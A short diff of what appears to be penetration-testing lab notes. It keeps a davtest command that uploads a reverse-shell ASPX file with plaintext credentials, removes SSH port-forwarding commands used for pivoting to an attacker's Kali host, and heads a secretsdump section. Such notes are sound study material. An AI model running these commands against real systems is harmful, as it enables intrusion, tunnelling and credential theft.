@@ -472,22 +472,6 @@ Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.
 davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122
 ```
 
-## SSH
-
-### remote port forwarding (target -> kali)
-
-- forward port 80 and 14147
-
-```sh
-ssh -N -R 80:127.0.0.1:80 -R 14147:127.0.0.1:14147 kali@192.168.45.247
-```
-
-### local port forwarding (kali -> target)
-
-```sh
-ssh -N -L 8000:127.0.0.1:8000 dev@192.168.249.150
-```
-
 ## Impacket
 
 ### impacket-secretsdump
